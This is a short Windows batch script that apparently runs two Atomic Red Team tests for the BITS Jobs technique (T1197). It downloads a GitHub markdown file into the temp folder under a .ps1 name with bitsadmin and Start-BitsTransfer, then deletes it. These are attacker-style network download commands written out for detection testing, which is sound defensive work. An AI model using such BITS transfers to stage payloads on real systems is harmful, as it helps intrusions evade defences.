@echo off
echo Testing

echo T1197 - BITS Jobs
echo 
echo Test #1
echo Atomic Test #1 - Bitsadmin Download (cmd)B
bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin_flag.ps1
echo 
echo Test #1 - Clean Up
del %temp%\bitsadmin_flag.ps1 >nul 2>&1

echo 
echo Atomic Test #2 - Bitsadmin Download (PowerShell) 
powershell -command "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin_flag.ps1"
echo 
echo "Test #2 - Clean Up"
powershell -command "Remove-Item $env:TEMP\bitsadmin_flag.ps1 -ErrorAction Ignore"

